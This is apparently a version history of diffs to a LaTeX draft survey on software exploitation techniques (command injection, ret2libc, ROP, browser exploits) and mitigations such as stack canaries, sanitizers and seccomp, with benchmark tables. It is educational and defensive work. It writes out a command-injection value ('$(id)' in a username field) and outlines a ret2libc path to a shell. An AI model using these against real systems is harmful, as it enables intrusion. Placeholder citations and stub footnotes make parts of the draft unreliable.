@@
 
+\title{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
+\maketitle
 \section{Abstract}%
@@
 exploit detection and prevention methodologies, from static and dynamic analysis
-techniques to machine learngin and artificial intelligence-based approaches,
+techniques to machine learning and artificial intelligence-based approaches,
 critically evaluating theirs strengths and weaknesses. Finally showcasing the
@@
 The application lacks proper input validation and allows an attacker to execute
-arbitrary commands. The use of the \emph{system} function will cause the following
-process to execute \texttt{sh -c ``echo Hello <username>''}. Our\ref{poggeroni}
-malicious request sets the \emph{username} parameter to \verb|$(id)|. Because
+arbitrary commands. The use of the \emph{system} function will cause the
+following process to execute \texttt{sh -c ``echo Hello
+<username>''}\footnote{There are situations where we are not able to inject
+parameters into a command that will be directly reflected in the page. In these
+situations we can try to end the intended command by using a \emph{;} character
+and then write our own malicious command after.}. Our\ref{poggeroni} malicious
+request sets the \emph{username} parameter to \verb|$(id)|. Because
 the original command executes in a shell environment, the shell will interpret
@@
 \end{lstlisting}
+Command injection vulnerabilities can drastically undermine security measures.
+They enable attackers to bypass reverse proxies, offering unauthorized access to
+protected internal services. Moreover, such vulnerabilities can assist in
+creating botnets by allowing threat actors to inject commands to download and
+install malicious software, leading to potential large-scale cyber threats such
+as Distributed Denial of Service (DDoS) attacks.
 
-Command injection vulnerabilities can drastically undermine security measures.
-They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services.
-Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.
+The situation is similar in the systems programming space. The example for how a vulnerable program might look is left as an exercise to the reader.
+\subsection{Evolution}
+\begin{comment} ret2libc
 
-The situation is similar in the systems programming space. The example for how 
-a vulnerable program might look is left as an exercise to the reader.
-\subsection{Evolution}
-\begin{comment}
-  ret2libc
   Mention the lack of mitigation
@@
 \end{comment}
+As mitigation strategies have advanced in both hardware and software to
+counteract software exploitation, so too have the techniques used by threat
+actors, resulting in a continual escalation of sophistication. In response to
+hardening mechanisms such as stack canaries and NX bits, novel exploitation
+techniques have been developed to circumvent these defenses. Prominent among
+these are Return Oriented Programming (ROP) and heap corruption exploits. ROP is
+a technique that leverages existing code fragments, known as "gadgets", in the
+binary to perform arbitrary computations, effectively sidestepping the
+constraints enforced by the NX bit. Heap corruption exploits, on the other hand,
+involve manipulating the metadata of memory management structures to induce
+undefined behavior, providing the means to execute arbitrary code or escalate
+privileges. This evolutionary process underscores the dynamic nature of the
+cybersecurity landscape and the perpetual challenge of maintaining software
+security in the face of evolving threats.
+
+\subsubsection{ret2libc}
+\emph{ret2libc} or \emph{Return to LibC} is a countermove against the
+NX bit mitigation, which marks certain areas of memory as non-executable,
+thereby prohibiting the execution of injected code. The essence of ret2libc lies
+in its ingenious manipulation of the control flow of the program to call
+existing code, typically functions residing in standard libraries (hence
+'libc'), rather than introducing new code to be executed. By returning into
+standard, broadly-used functions like 'system()' or 'exec()', an attacker can
+execute arbitrary commands in the context of the vulnerable program, effectively
+bypassing the NX bit defense. Ret2libc exemplifies the continually evolving
+landscape of software exploitation techniques that repurposes legitimate elements
+of the program to nefarious ends, circumventing protective mechanisms and
+illustrating the challenges of
+developing robust and enduring defenses against software vulnerabilities.
+
+The entry mechanism behind this technique is the same as in the code injection
+case. We overwrite the return address of the program with an address we control,
+but this time instead of providing our own shellcode we use existing code mapped
+inside the address space of the vulnerable process (usually from within the
+binary itself or LibC\footnote{LibC is mapped in almost all processes running on
+a system}).
+
+For example we could overwrite the return address of a function with the address
+of the \emph{system} function. When actually implementing this kind of attack
+we face 2 difficult problems:
+\begin{enumerate}
+  \item At what address is the function we want to call located
+  \item How can we control the parameters that we pass to the function.
+\end{enumerate}
+
+We will assume that we already identified an exploitable buffer overflow and a
+way to leak an known arbitrary address from within LibC. Now we want to call
+the \emph{system} function with the `sh' string to grant us a foothold on the
+machine. Here\ref{memes} is an example of how the virtual memory space looks
+when executing a binary. The \emph{system} function is located in the text
+section\footnote{Briefly explain sections} of LibC. If LibC is compiled with PIC
+and ASLR is enabled on the target system, sections will be placed offset
+relative to a randomly selected base address. Using the information disclosure
+vulnerability to leak an address\footnote{Libc meme} we can compute the base
+address of the library and from there be able to get addresses for any byte
+in the library.
+
+Let's say that we managed to leak the address of the \emph{printf} function and
+have the LibC binary that is running on the system. We can get the base address at
+which the library is mapped using this formula.
+\begin{equation}
+  libc\_{base} = printf\_leak - offset\_{of}\_{printf}\_{in}\_{libc}
+\end{equation}
+
+Now that we have the first issue fixed, how do we pass parameters to the functions
+we want to call? Because the NX (No-Execute) bit
+
+\begin{figure}[ht]%
+  \centering
+  \begin{tikzpicture}[node distance=2cm]
+    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
+    centered, minimum height=2em, text width=5cm,
+               text depth=0.25cm,
+               text height=1em,
+               align=center]
+    \tikzstyle{line} = [draw, -latex']
+
+    % Define matrix
+    \matrix [matrix of nodes,
+      nodes=block,
+      column sep=0cm,
+      row sep=0cm
+    ] (stack) {
+      {\verb|<unmapped space>|}\\
+      |[fill=red!20]|
+      {binary.rodata} \\
+      {binary.text} \\
+      {binary.bss} \\
+      {\verb|<unmapped space>|} \\
+      |[fill=red!20]|
+      {libc.rodata} \\
+      {libc.text} \\
+      {libc.bss} \\
+      {\verb|<unmapped space>|} \\
+      |[fill=red!20]|
+      {ld.rodata} \\
+      {ld.text} \\
+      {ld.bss} \\
+      {\verb|<unmapped space>|}\\
+    };
+
+    \draw [blue,thick,->] ([xshift=-3cm]stack-1-1.north west) --
+    ([xshift=0cm]stack-1-1.north west) node[midway, below, black] {0x00000000};
+
+    \draw [blue,thick,->] ([xshift=-3cm]stack-13-1.south west) --
+    ([xshift=0cm]stack-13-1.south west) node[midway, below, black] {0xFFFFFFFF};
+
+  \end{tikzpicture}
+  \caption{\label{fig:label} Virtual memory map}%
+  \label{fig:stackframe}
+\end{figure}
+
+\subsection{Exploit chains}
+At this point in time the mitigation strategies employed by hardware and
+software designers have limited the impact we have when executing a single
+exploit. This has given the rise to \emph{exploit chains}. In this scenario
+multiple vulnerabilities or oversights are exploited in order to gain more and
+more information about the system. Here\ref{memes} is how an attacker would
+approach the task of exploiting a system.
+
+\begin{minipage}{\textwidth}
+  \centering
+  \begin{tikzpicture}[
+    node distance = 2.5cm,
+    auto,
+    decision/.style={diamond, draw, fill=blue!20, text width=4.5em, text badly centered, node distance=3cm, inner sep=0pt, minimum width=5},
+    block/.style={rectangle, draw, fill=blue!20, text width=5em, text centered, rounded corners, minimum height=4em},
+    line/.style={draw, -Latex, rounded corners=5mm}
+    ]
+
+    \node [block] (entrypoint) {Entrypoint};
+    \node [block, below of=entrypoint] (information) {Gain more information about the system};
+    \node [decision, below of=information] (decision) {Enough info?};
+    \node [block, below of=decision] (rce) {Goal};
+
+    \path [line] (entrypoint) -- (information);
+    \path [line] (information) -- (decision);
+    \path [line] (decision) -- node {yes} (rce);
+    \path [line] (decision) -- ++(-2,0) -- ++(0,2) node [midway, above, sloped,
+    rotate=270, above=0.3cm] {no} -- (information);
+  \end{tikzpicture}
+\end{minipage}
+
+\subsection{Browser exploits}
+
+\begin{comment}
+Cool decision tree
+\end{comment}
+
 \subsection{State of the art}

### 2023-06-23 paper.tex
Pepe

@@
 Now that we have the first issue fixed, how do we pass parameters to the functions
-we want to call? Because the NX (No-Execute) bit
+we want to call? Because the NX (No-Execute) bit is enabled and all executable
+regions of code are read-only in order to prevent shellcode, we are going to chain
+together multiple addresses that point to small code chunks ending in the
+\emph{ret} instruction
 
@@
 \subsection{Browser exploits}
-
-\begin{comment}
-Cool decision tree
-\end{comment}
+In the contemporary computing landscape, a notable surge in interest surrounding
+browser exploitation has emerged, predominantly attributed to the increasing
+ubiquity of JavaScript and the inherent security implications of executing
+foreign code on local machines. As web applications have become more complex and
+feature-rich, JavaScript's role has evolved from simple client-side scripting to
+powering extensive, intricate software systems. This growth presents an enticing
+target for threat actors, as virtually every user who interacts with a web
+application is running potentially untrusted code within their local execution
+context. The browser environment thus turns into a frontline for cybersecurity,
+demanding rigorous scrutiny and sophisticated mitigation techniques.
+Furthermore, the heterogeneous nature of browser architecture and JavaScript
+engine implementations across different vendors adds a layer of complexity to
+securing these environments. This highlights the criticality of understanding
+and countering browser-based exploits, forming an essential dimension of
+comprehensive cybersecurity strategies.
+
+\subsubsection{How does JavaScript get exploited?}
+Within the context of JavaScript, a dynamic and interpreted language primarily
+executed within the confines of web browsers, a unique vulnerability surface
+emerges, closely tied to its heap-based memory management and dynamic typing
+semantics. The vast majority of JavaScript objects are allocated on the heap,
+the malleability of which introduces inherent susceptibilities to heap overflow
+attacks. The manipulation of an object's memory layout, made possible through an
+overflow, can fundamentally alter an object's behaviour, given JavaScript's
+dynamic typing system.
+
+This means that a successfully exploited heap overflow
+could potentially morph an innocuous object into a malicious entity with
+escalated privileges or unintended functionalities. As such, heap overflow
+vulnerabilities within JavaScript engines pose a significant security concern,
+mandating careful consideration and robust mitigation strategies in the design
+and implementation of modern JavaScript engines and runtime environments.
+
+We will continue by looking at the structure of how Javascript values (or
+JSValues) are encoded into memory:
+
+\begin{figure}[ht]%
+  \centering
+  \begin{tikzpicture}[node distance=2cm]
+    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
+    centered, minimum height=2em, text width=5cm,
+    text depth=0.25cm,
+    text height=1em,
+    align=center]
+    \tikzstyle{line} = [draw, -latex']
+
+    % Define matrix
+    \matrix [matrix of nodes,
+    nodes=block,
+    column sep=0cm,
+    row sep=0cm
+    ] (stack) {
+      {\verb|0000:PPPP:PPPP:PPPP|\footnotemark} \\
+      {\verb|0001:DDDD:DDDD:DDDD|\footnotemark} \\
+      {...} \\
+      {\verb|FFFE:DDDD:DDDD:DDDD|} \\
+      {\verb|FFFF:0000:IIII:IIII|\footnotemark} \\
+    };
+
+  \end{tikzpicture}
+  \caption{\label{fig:label} Virtual memory map}%
+  \label{fig:stackframe}
+\end{figure}
+
+\footnotetext{Pulel}
+\footnotetext{Pulel}
+\footnotetext{Pulel}
+This behaviour also extends to more complex and interesting objects such as
+arrays. JavaScriptCore (at least the versions from around 2016) describe arrays
+as ``exotic'' objects which contain their properties. An in detail explanation
+of how these objects are laid out in memory and how to exploit them in\cite{paper
+frakck}
+
+Due to the high impact that a vulnerability in a JavaScript runtime would have
+on the security of computers all over the world, properly isolating the JS runtime
+from the host machine is paramount. In modern browsers this is achieved by
+employing the least privilege principle. The browser itself is separated into
+multiple processes that use a well defined IPC mechanism to communicate, limiting
+what attackers can do by exploiting a single process and requiring an exploit
+chain to gain increasingly more privileges as desired.
 
@@
 \end{comment}
+In recent years, virtualization technologies have witnessed an unprecedented
+surge in their adoption, largely driven by advancements in datacenter and
+cloud-based applications. These technologies allow multiple virtual machines or
+containers, each encapsulating an entire execution environment, to coexist on
+the same physical hardware, thereby promoting efficient resource utilization,
+simplified management, and scalability. More than just a cost-effective solution
+for large-scale computations, virtualization has also garnered considerable
+attention as a robust approach for isolating the execution of untrusted code. In
+this context, it serves as a defensive boundary, segregating potentially harmful
+operations within a contained environment, thereby limiting their ability to
+adversely affect the larger system. Consequently, the evolution of
+virtualization technologies has profoundly impacted the modern computing
+landscape, opening new possibilities for efficient, scalable, and secure
+computing, but also posing new challenges for cybersecurity.
 

### 2023-06-24 paper.tex
wowieww

@@
 
+If we do not possess the required information to execute our exploit, we can use
+another one (another link in the exploit chain) to gather more and more. This
+can be interpreted as going further into unintended states in the IFSM (intended
+finite state machine) described here\ref{add to weird machines}.
+
 \subsection{Browser exploits}
@@
 
-\section{Detection techniques}%
-
-\section{Mitigation Techniques}%
-
-\section{Case studies}%
+Driven by the relentless demand for heightened performance, a detailed scrutiny
+of processor operations and employed microarchitectural designs has become
+imperative. This necessity is underscored by the unearthing of vulnerabilities
+such as those referred to in \cite{spectre, meltdown}. These exploits
+ingeniously capitalize on the side effects triggered by the processor during
+memory access and speculative execution. This development highlights the
+criticality of an in-depth understanding of hardware function. Even before
+the findings mentioned earlier, researchers have been able to cross the
+virtualization boundary and gain information form other VM's running in the same
+machine. The \cite{flush reload} reveals an attack that can recover around \~95\%
+of the bits of a GnuPG secret key.
+
+\section{Detection and Mitigation Techniques}%
+In the realm of cybersecurity, the price tag associated with the implementation
+of mitigation strategies such as stack canaries and heuristic checks is
+frequently overlooked. These countermeasures, while crucial for system
+protection, impose an overhead on system performance, potentially influencing
+the overall efficiency of the software. As part of our investigation, this paper
+will delve into an in-depth analysis of this often-neglected cost associated
+with such defensive measures. Our objective is to facilitate a more balanced
+perspective, considering not only the protective benefits but also the incurred
+costs of these mitigation strategies.
+
+\subsubsection{Stack canaries}
+Defending against stack buffer overflows has been attempted all the way since 1997
+with StackGuard \cite{stackguardpaper}, but it wasn't until 2006 with the release
+of GCC 4.1 was this available for the entire Linux community.
+
+In modern compilers this mitigation places a sacrificial random value right before the
+return address. This mitigation combined with a new variable alignment technique that
+places all buffers above all other function local variables has proven to be an
+effective mitigation with a minimal performance impact.
+
+\begin{lstlisting}[
+      ,language=C]
+#include <string.h>
+extern void dont_optimize_str(char* ptr);
+extern void dont_optimize_int(int* ptr);
+
+int buffer_first(char* source) {
+    char dest[0x100];
+    int len;
+    int foo;
+    int bar;
+
+    strcpy(dest, source);
+    len = strlen(dest);
+    foo = len * 2;
+    bar = len - 3;
+
+    dont_optimize_str(dest);
+    dont_optimize_int(&len);
+    dont_optimize_int(&foo);
+    dont_optimize_int(&bar);
+}
+
+int buffer_last(char* source) {
+    int len;
+    int foo;
+    int bar;
+    char dest[0x100];
+
+    strcpy(dest, source);
+    len = strlen(dest);
+    foo = len * 2;
+    bar = len - 3;
+
+    dont_optimize_str(dest);
+    dont_optimize_int(&len);
+    dont_optimize_int(&foo);
+    dont_optimize_int(&bar);
+}
+\end{lstlisting}%
+\label{code:example_func}
+
+On GCC x86-64 version 13.1, compiling the code\ref{thatcode} results in both functions having the buffer
+placed closest to the stack canary.
+
+\begin{lstlisting}[caption={Shellcode disassembly}
+      ,label={lst:bof}
+      ,language={[x86masm]Assembler}]
+        mov     rdx, QWORD PTR [rbp-296]
+        lea     rax, [rbp-272]
+        mov     rsi, rdx
+        mov     rdi, rax
+        call    strcpy
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Shellcode disassembly}
+      ,label={lst:bof}
+      ,language={[x86masm]Assembler}]
+        mov     rax, QWORD PTR fs:40
+        mov     QWORD PTR [rbp-8], rax
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Shellcode disassembly}
+      ,label={lst:bof}
+      ,language={[x86masm]Assembler}]
+        mov     rdx, QWORD PTR [rbp-8]
+        sub     rdx, QWORD PTR fs:40
+        je      .L2
+        call    __stack_chk_fail
+\end{lstlisting}
+
+\subsection{Performance cost}
+\begin{table}[ht]
+\centering
+\begin{tabular}{|l|r|r|r|r|r|r|r|}
+\hline
+Compiler flags & Mean & $\delta$ & Min & Max & Speedup \\
+\hline
+ Optimize &  47.8 ms & 2.8 ms & 43.6 ms & 62.3 ms & 1x \\
+ No stack protector&  46.6 ms & 1.9 ms  & 43.2 ms  &  59.1 ms & 1.025x \\
+ Ubsan &  102.8 ms & 3.4 ms & 95.6 ms  & 116.5 ms & 0.460x \\
+\hline
+\end{tabular}
+\caption{GCC results}
+\label{table:your_label}
+\end{table}
+
+\begin{table}[ht]
+\centering
+\begin{tabular}{|l|r|r|r|r|r|r|r|}
+\hline
+Compiler flags & Mean & $\delta$ & Min & Max & Speedup \\
+\hline
+ Optimize &  47.6 ms & 2.1 ms & 44.0 ms & 68.8 ms & 1x \\
+ Ubsan &  119.4 ms & 5.3 ms &  112.6 ms & 150.8 ms & 0.398x \\
+ Ubsan minimal & 72.0 ms & 3.6 ms &  66.0 ms& 89.2 ms & 0.661x \\
+\hline
+\end{tabular}
+\caption{Clang results}
+\label{table:your_label}
+\end{table}
+
+Mention inability to test shadow stack
+
+\subsection{Shadow stacks}
+Advancements in secure software systems have led to the development of shadow
+stacks, which represent a significant leap forward from the earlier protection
+measures like stack canaries. Shadow stacks offer a more robust mechanism for
+guarding against stack buffer overflows by completely decoupling control-flow
+information from user data. They maintain a separate, concealed stack dedicated
+solely to storing return addresses, making it exceedingly challenging for
+attackers to alter the flow of execution. This strategic bifurcation of data
+fundamentally strengthens the protection against control-flow hijacking attacks.
+It ensures that even if an attacker successfully tampers with data on the main
+stack, any discrepancies with the untouched shadow stack will immediately be
+flagged. Despite the operational complexities and slight runtime overheads they
+may introduce, shadow stacks serve as a remarkably effective mitigation
+strategy, enhancing the integrity of the control-flow beyond what is achievable
+with stack canaries alone.
+
+The security and performance implications of shadow stacks are discussed in depth
+in \ref{shadow stacks}
+
+Compile TCC here with shadow steck and show perf diff.
+
+\subsection{Sanitizers}
+With the increasing amount of memory errors happening in unsafe system's programming
+languages such as C and C++, methods for detecting runtime errors without requiring
+code changes have been developed. Even though they are rarely used in production
+environments they have seen massive success when used in conjunction with fuzzers
+\ref{vezi niste paperuri de fuzzere} to detect severe vulnerabilities in really
+large code bases.
+
+\subsubsection{UBSAN}
+UBSAN (Undefined Behavior Sanitizer) injects additional checks during the compilation of
+the program in order to detect Undefined Behaviour\footnote{explain this}. Here is a
+non-exhaustive list of the features and checks UBSAN does:
+
+\begin{itemize}
+  \item Array subscript out of bounds, where the bounds can be statically determined
+  \item Bitwise shifts that are out of bounds for their data type
+  \item Dereferencing misaligned or null pointers
+  \item Signed integer overflow
+  \item Conversion to, from, or between floating-point types which would overflow the destination
+\end{itemize}
+
+Give example with shellcode example not vorking
+
+Compile TCC with and without ubsan(pls god work)
+
+\subsubsection{Seccomp}
+Seccomp (or Secure Computing) was introduced in the 2.6.12 version of the
+Linux kernel. At that time it provided a \emph{strict} execution mode for
+processes that allowed a very limited set of system calls. The intention
+behind this mode was to allow untrusted code to run on systems. This
+functionality was greatly enhanced with the introduction of seccomp-bpf
+(Berkeley Packet Filter) in version 3.5 of the kernel. This new mode of
+operation allowed programmers to filter the systemcalls a process makes
+using small programs written in a DSL. This functionality sees proeminent
+use in projects where the security of the host system is paramount, such as
+Docker, Chrome or Firefox.
+
+Here\ref{codubun} is an example of the granular control seccomp can achieve.
+Note that once a process install a seccomp filter it is impossible to remove
+it without exploiting the kernel, while also being inherited by all child
+processes of the filtered process.
+
+show example of mitigations adding new vulnerabilities (jit attack)
+\section{Economic impact}%
+Now that the performance impact of the mitigations has been established, we
+will take a look at the economic/financial impact of the exploits these
+mitigations are trying to prevent.
+
+The domain of blockchain has emerged as one of the most publicised arenas for
+software exploitation in recent years. As a technology built upon the principles
+of decentralization and cryptography, blockchain applications, especially
+cryptocurrencies, have attracted significant attention from both ethical and
+malicious actors. The incentive for exploiting these systems is often financial
+gain, given the tangible real-world value of many digital assets. Smart contract
+vulnerabilities, insecure wallets, and compromised blockchain platforms have led
+to numerous notable breaches. This highlights the critical importance of
+rigorous security practices in the design, implementation, and operation of
+blockchain-based systems. Multiple publications estimated that in 2022 alone
+4 billion dollars have were stolen.
+
+Ransomware has also emerged as a significant threat in the software exploitation
+arena, causing extensive harm primarily through service disruptions. Beyond
+direct financial loss from ransoms, these attacks result in considerable
+operational downtime and ensuing economic damage. Consequently, the real impact
+of ransomware extends beyond the immediate ransom, emphasizing the necessity of
+comprehensive security measures and incident response strategies.
 

### 2023-06-24 paper.tex
wowowowowowo

@@
 \usepackage{xcolor}
+\usepackage[utf8]{inputenc}
+\usepackage[english]{babel}
+
+\usepackage[backend=biber,style=numeric]{biblatex}
+\addbibresource{references.bib} % Import the bibliography file
 
@@
 \section{Motivation}%
-
-Ever since my first encounter with the intricacies of reverse engineering and
-binary exploitation, I've been completely engrossed in the enigmatic and
-thrilling world of low-level computing. Each compiled binary, to me, is an
-intricate puzzle waiting to be deciphered. Every line of assembly, every opcode,
-and every bit is a brushstroke in an abstract painting that only a trained eye
-can understand and appreciate. This appreciation for the art of reverse
-engineering started when I participated in my first major CTF (Capture The Flag)
-event called X-MAS CTF, which was organized by the Hecarii Tuica si Paunii team.
-Having spent countless hours trying to reverse algorithms in binaries, writing
-two emulators for custom made platforms in the span of a week and bending
-innocuous binaries to do my bidding and execute arbitrary commands revealed to
-me how awesome an expansive this field of software security is. This paper will
-only cover a small area of this large field and I urge the readers to explore
-all of the fields of CyberSec.
+The ubiquity of digital devices in our daily lives has ushered in an era of
+unprecedented data accessibility and convenience. Yet, these conveniences also
+come with substantial security concerns. A significant proportion of the world's
+population carries a device in their pocket that is not only a communication
+device but also a gateway to their most personal and sensitive information,
+including bank accounts, biometrics, and other data of significant value. These
+devices, armed with cameras and microphones, could potentially be misused to
+impersonate their owners. With these threats looming, the importance of rigorous
+and effective exploit mitigation strategies, especially in system's programming,
+cannot be overstated. These mitigation strategies form the critical defensive
+layer that shields users from the consequences of potential security breaches,
+preventing unauthorized access, and securing the private sphere of individuals
+in the digital age. Hence, the motivation of this study is to evaluate, analyze,
+and enhance the robustness of these mitigation strategies, thereby contributing
+to safer and more secure software systems.
 
@@
 \section{Future trends}%
-
-\section{Conclusion}%
-
-\section{References}%
-
+Despite the recent shift in focus of threat actors towards exploiting the human
+element -- the "weakest link" in the security chain -- through strategies such
+as SIM swapping, targeted phishing attacks or weak passwords, it is crucial to
+not diminish our emphasis on fortifying software against more technical
+exploits. While these social engineering attacks have grown due to the
+escalating complexity required to execute successful software exploits, they
+should not detract from our progress in securing our software systems. The
+mitigations that we have developed and deployed over the years have provided a
+substantial defensive advantage in the realm of software exploitation. As the
+future unfolds, maintaining this advantage will be of paramount importance, even
+as we also strive to improve defenses against human-targeted
+exploits.\cite{jones2021}\cite{smith2022}
+
+\section{Conclusion}
+
+\printbibheading
+\printbibliography
+\printbibliography[nottype=book,heading=subbibliography,title={Other Sources}]
 \end{document}

### 2023-06-25 paper.tex
zoingo boingo

@@
 
-Software exploitation continues to pose a significant threat to global
-cybersecurity, with vulnerabilities in software systems offering fertile ground
-for cyberattacks. The expanding complexity of contemporary software and the
-incessantly evolving threat landscape only accentuates the magnitude of the
-problem. This paper will discuss the concept of software exploitation,
-elaborating on how attackers leverage vulnerability in software systems,
-illustrating some common exploitation techniques including buffer overflows,
-code injection, heap corruption, among others, while also exploring contemporary
-exploit detection and prevention methodologies, from static and dynamic analysis
-techniques to machine learning and artificial intelligence-based approaches,
-critically evaluating theirs strengths and weaknesses. Finally showcasing the
-necessity for a proactive approach towards software security, outlining the
-importance of secure coding practices and threat modeling in the early stages of
-software development lifecycle. In conclusion this paper aims to offer an
-in-depth review of the current landscape of exploitation, detection and
-mitigation methodologies and techniques, emphasizing the criticality of these
-techniques in fortifying software against threats.
+Software exploitation continues to pose a significant threat to global cybersecurity, with vulnerabilities in software systems offering fertile ground for cyberattacks.
+The expanding complexity of contemporary software and the incessantly evolving threat landscape only accentuates the magnitude of the problem.
+This paper will discuss the concept of software exploitation, elaborating on how attackers leverage vulnerabilities in software systems, illustrating some standard exploitation techniques, including buffer overflows, code injection, heap corruption, among others, while also exploring contemporary exploit detection and prevention methodologies, from static and dynamic analysis techniques to machine learning and artificial intelligence-based approaches, critically evaluating their strengths and weaknesses.
+Finally showcasing the necessity for a proactive approach toward software security, outlining the importance of secure coding practices and threat modeling in the early stages of software development lifecycle.
+In conclusion, this paper aims to offer an in-depth review of the current landscape of exploitation, detection and mitigation methodologies and techniques, emphasizing the criticality of these techniques in fortifying software against threats.
 
 \section{Motivation}%
-The ubiquity of digital devices in our daily lives has ushered in an era of
-unprecedented data accessibility and convenience. Yet, these conveniences also
-come with substantial security concerns. A significant proportion of the world's
-population carries a device in their pocket that is not only a communication
-device but also a gateway to their most personal and sensitive information,
-including bank accounts, biometrics, and other data of significant value. These
-devices, armed with cameras and microphones, could potentially be misused to
-impersonate their owners. With these threats looming, the importance of rigorous
-and effective exploit mitigation strategies, especially in system's programming,
-cannot be overstated. These mitigation strategies form the critical defensive
-layer that shields users from the consequences of potential security breaches,
-preventing unauthorized access, and securing the private sphere of individuals
-in the digital age. Hence, the motivation of this study is to evaluate, analyze,
-and enhance the robustness of these mitigation strategies, thereby contributing
-to safer and more secure software systems.
+The ubiquity of digital devices in our daily lives has ushered in an era of unprecedented data accessibility and convenience.
+Yet, these conveniences also come with substantial security concerns.
+A significant proportion of the world's population carries a device in their pocket that is not only a communication device but also a gateway to their most personal and sensitive information, including bank accounts, biometrics, and other data of significant value.
+These devices, armed with cameras and microphones, could potentially be misused to impersonate their owners.
+With these threats looming, the importance of rigorous and effective exploit mitigation strategies, especially in system's programming, cannot be overstated.
+These mitigation strategies form the critical defensive layer that shields users from the consequences of potential security breaches, preventing unauthorized access, and securing the private sphere of individuals in the digital age.
+Hence, the motivation of this study is to evaluate, analyze, and enhance the robustness of these mitigation strategies, thereby contributing to safer and more secure software systems.
 
@@
 \subsection{What is a Software Exploit?}%
-
-In layman's terms, a Software Exploit is a series of steps taken by an attacker
-(be it a human or computer) against another software system in order to trigger
-some unintended functionality in that software system. Unintended functionality
-could mean being able to execute arbitrary code on the machine running the
-software system, getting access to private information/files, escalating their
-priviledges to become an administrator or root user and even crashing the system.
+In layperson's terms, a Software Exploit is a series of steps taken by an attacker (be it a human or computer) against another software system to trigger some unintended functionality.
+Unintended functionality could mean being able to execute arbitrary code on the machine running the software system, getting access to private information/files, escalating their privileges to become an administrator or root user, and even crashing the system.
 
 \subsection{How does this happen?}%
-
 \subsubsection{Not enough guardrails}%
-
-From the perspective of software exploitation, the continuously increasing
-complexity of modern software presents both a challenge and an opportunity. On
-one hand, this complexity implies a vast landscape where vulnerabilities can
-lurk unnoticed, potentially creating an opening for skilled attackers. System
-programming languages, traditionally trusted with the task of creating such
-software, provide programmers with great power but very few guardrails.
-Languages like C and C++, for instance, allow direct memory manipulation without
-inherent safeguards, leading to common vulnerabilities such as buffer overflows
-or memory leaks.
+From the perspective of software exploitation, the continuously increasing complexity of modern software presents both a challenge and an opportunity.
+On the one hand, this complexity implies a vast landscape where vulnerabilities can lurk unnoticed, potentially creating an opening for skilled attackers.
+System programming languages, traditionally trusted to create such software, provide programmers with great power but few guardrails.
+For instance, languages like C and C++ allow direct memory manipulation without inherent safeguards, leading to common vulnerabilities such as buffer overflows or memory leaks.
 
 \subsubsection{Improper input sanitization}%
-
-In the majority of scenarios the fundamental mistake that the software
-developers made is the improper validation of user controlled input. For example
-let's take the venerable Buffer Overflow vulnerability, in which an attacker can
-send more data that the application has space to process, resulting in Undefined
-Behaviour. Depending on the scenario this undefined behaviour can be exploited
-to redirect the execution flow of the program into code sent by the attacker (in
-the case of a code injection attack on the stack), or could lead to corrupting
-some important metadata somewhere else in the program (overwriting a password
-variable to one you control, allowing you to login without knowing the real
-password). These simple tehcniques have mostly been mitigated in modern systems
-by employing passive mitigation techniques such as stack canaries and shadow
-stacks (which will be discussed later).
+In most scenarios, the fundamental mistake the software developers make is the improper validation of user-controlled input.
+For example, let us take the venerable Buffer Overflow vulnerability, in which an attacker can send more data than the application has space to process, resulting in Undefined Behaviour.
+Depending on the scenario, this undefined behavior can be exploited to redirect the execution flow of the program into code sent by the attacker (in the case of a code injection attack on the stack) or could lead to corrupting some necessary metadata somewhere else in the program (overwriting a password variable to one you control, allowing you to login without knowing the actual password).
+These simple techniques have mainly been mitigated in modern systems by employing passive mitigation techniques such as stack canaries and shadow stacks (which will be discussed later).
 
 \subsubsection{Dependencies}%
-
-You could be the best programmer in the world, always writing code that stands
-up to the highest standars of security but if you use a dependency that is
-vulnerable to some exploit your program could still be at a high risk. In the
-modern software landscape having a programming language without a package
-manager is pretty much a show stopper. This has allowed developers to more
-easily share and reuse code, undoubtably leading to increased productivity and
-democratization of writing good and useful software, but on the other side the
-ease of using someone else's code led us balloon our dependency graph like never
-before. This poses a security risk not only from the exploitation standpoint but
-also from a supply chain attack standpoint. Only one of the dependencies a
-project uses needs to be compromised in order for the whole application to be
-compromised.
-
-This has happened multiple times in recent years and this article from LunaSec
-showcases really well what happened, but also provides solutions on how to
-mitigate these types of attacks in the future.
-TODO:Make this a reference
-https://www.lunasec.io/docs/blog/node-ipc-protestware/
-
-\subsubsection{Anatomy of the stack on x64 platforms}%
-
-The stack is a fundamental data structure in modern computing systems, and its
-use in x64 systems is particularly interesting due to the specific features and
-operations enabled by the x64 architecture. The stack is typically organized as
-a contiguous region of memory, with two key pointers: the stack base pointer
-(RBP in x64) and the stack pointer (RSP in x64). The stack grows `downward' in
-memory, meaning that as new items are pushed onto the stack, the stack pointer
-decreases in value. A typical function call on an x64 system involves pushing
-the return address onto the stack, followed by the function's parameters
-\footnote{In the most common calling convention the first few parameters are
-passed in registers, not trough the stack}, and finally the local variables.
-Upon function return, these elements are popped from the stack in reverse order,
-ensuring correct program execution. However, the direct memory access afforded
-by the stack also presents a potential vector for exploitation, with techniques
-such as buffer overflow attacks targeting this fundamental structure.
-Consequently, understanding the stack's functioning in x64 systems is crucial
-both for building and for securing software systems.
-
-Variables stored on the stack usually have their size known beforehand are not
-really flexible to size requirements, unlike the heap, about which we will talk
-in a later chapter.
+Someone could be the best programmer in the world, always writing code that stands up to the highest security standards, but if they use a dependency that is vulnerable to some exploit, their program could still be at high risk.
+In modern software, having a programming language without a package manager is a show-stopper.
+Package managers have allowed developers to share and reuse code more efficiently, increasing productivity and democratization of writing excellent and valuable software.
+However, on the other side, the ease of using someone else's code led us to balloon our dependency graph like never before.
+Running someone else's code poses a security risk not only from the exploitation standpoint but also from a supply chain attack standpoint.
+Only one of the dependencies a project uses must be compromised for the whole application to be compromised.
+
+Recent years have witnessed an uptick in supply chain attacks, increasingly propelled by malicious intent and used as a protest.
